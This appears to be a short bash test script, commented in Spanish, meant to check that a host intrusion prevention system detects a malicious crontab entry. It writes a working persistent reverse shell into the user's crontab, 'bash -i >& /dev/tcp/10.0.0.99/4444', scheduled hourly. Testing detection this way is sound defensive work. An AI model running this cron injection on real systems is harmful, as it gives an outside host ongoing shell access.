#!/usr/bin/env bash
echo "[*] Añadiendo entrada persistente maliciosa en el crontab del usuario actual ($(whoami))..."

# Guardamos el cron actual, le sumamos la línea maliciosa y lo volvemos a inyectar
(crontab -l 2>/dev/null; echo "0 * * * * bash -i >& /dev/tcp/10.0.0.99/4444 0>&1") | crontab -

echo "[+] Línea maliciosa inyectada en el crontab con éxito."
echo "[*] El HIPS auditará los crontabs, detectará el string 'bash -i' y reescribirá el archivo removiendo la amenaza."